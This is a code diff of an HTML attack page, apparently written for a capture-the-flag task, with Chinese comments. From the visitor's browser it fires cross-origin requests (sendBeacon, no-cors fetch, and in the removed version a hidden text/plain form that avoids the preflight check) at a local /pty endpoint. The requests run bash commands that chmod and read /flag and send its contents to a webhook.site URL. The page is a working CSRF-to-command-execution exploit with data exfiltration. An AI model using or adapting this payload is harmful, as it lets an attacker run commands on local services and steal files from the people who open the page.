@@ -4,36 +4,43 @@
     <script>
         const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
         
-        // 信号确认
-        fetch(`${WEBHOOK}?status=attempting_form_csrf`);
+        // 信号：开始最后一次尝试
+        fetch(`${WEBHOOK}?status=last_resort_attempt`);
 
-        function sendCommand(port) {
-            // 构造要执行的命令
-            const cmd = `node -e "fetch('${WEBHOOK}?port=${port}&flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
-            
-            const payload = JSON.stringify({
-                command: '/bin/bash',
-                args: ['-c', cmd]
+        // 构建命令：读取 flag 并通过 curl 或 node 回传
+        // 增加了一个 000 权限绕过逻辑：虽然我们是 node 用户，
+        // 但有时直接读取 000 文件会失败，尝试先 chmod 444
+        const cmd = `chmod 444 /flag && node -e "fetch('${WEBHOOK}?flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
+
+        const payload = JSON.stringify({
+            command: '/bin/bash',
+            args: ['-c', cmd]
+        });
+
+        // 策略 1: 使用 localhost 替代 127.0.0.1
+        function tryPort(port) {
+            const targets = [
+                `http://localhost:${port}/pty`,
+                `http://127.0.0.1:${port}/pty`
+            ];
+
+            targets.forEach(url => {
+                // A. 尝试 sendBeacon
+                try {
+                    navigator.sendBeacon(url, new Blob([payload], {type: 'text/plain'}));
+                } catch(e) {}
+
+                // B. 尝试 fetch no-cors
+                fetch(url, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: payload
+                }).catch(e => {});
             });
-
-            // 创建一个隐藏的 form
-            const form = document.createElement('form');
-            form.action = `http://127.0.0.1:${port}/pty`;
-            form.method = 'POST';
-            form.enctype = 'text/plain'; // 使用 text/plain 绕过复杂请求的预检
-
-            const input = document.createElement('input');
-            input.name = payload; // 将整个 JSON 作为键名，后端如果解析不严会当做 body 处理
-            input.value = "";
-
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
         }
 
-        // 同时尝试两个可能端口
-        setTimeout(() => sendCommand(4096), 1000);
-        setTimeout(() => sendCommand(3000), 2000);
+        // 循环尝试端口
+        [4096, 3000].forEach(p => tryPort(p));
     </script>
 </body>
 </html>
